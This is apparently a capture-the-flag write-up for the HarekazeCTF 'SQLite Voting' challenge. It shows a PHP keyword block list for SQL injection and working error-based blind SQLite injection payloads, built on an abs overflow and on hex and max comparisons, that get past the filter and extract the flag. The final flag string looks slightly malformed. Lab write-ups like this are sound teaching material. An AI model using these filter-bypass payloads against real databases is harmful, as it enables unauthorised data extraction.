# SQLite Voting

```php
function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / < = > \ _ ` ~ -
    "[\"%'*+\\/<=>\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

// request to SQLite db, I skipped is_valid($id)
$res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}"); 
if ($res === false) {
  die(json_encode(['error' => 'An error occurred while updating database']));
}
```

We can see that we've got a heavily filtered error-based blind sql injection.

## Solution

First we got the length of the flag by enumerating through `$LENGTH$` in the following payload:

```sql
abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))
```

I will explain the payload bit-by-bit later, but the flag was 38 characters long.

Then, we double hexed the `flag` so we can be sure that it only produces digits

```sh
sqlite> select hex('0123456789ABCDEF');
30313233343536373839414243444546
```

We also know that the length of the produced number is exactly 152-digit long.

You cannot pass integers bigger than `9223372036854775807` because they will get cast into floating numbers, but you can concatenate them as they were strings, e.g. `9223372036854775807||9223372036854775807` will produce `92233720368547758079223372036854775807`. Thanks to this property we now can iterate over all composited 152-digit long `$NUMBER$` and use the `max(A, B)` function which will return the bigger one.

```sql
abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))
```

We get the double hexed flag which is: 
`343836313732363536423631374136353433353434363742333433313644354633373330354636323333354633343546333537313643333133373333354636443334333533373333373237430`

**HarekazeCTF{41m_70_b3_4_5ql173_m4573r|**

**Explaination**:
- `abs(-9223372036854775808)` will cause integer overflow and hence throw an error
- `0x8000000000000000` is hex-encoded `-9223372036854775808`
- `nullif(A,B)` will return `NULL` if `A` equals `B`, returns `A` otherwise
- `ifnull(A,0x8000000000000000)` will return `0x8000000000000000` if `A` is `NULL`, otherwise `A` is returned.
- `max(A,B)` returns lexicographically greater string.
- `hex(hex(flag)` "removes" all non-digit characters from flag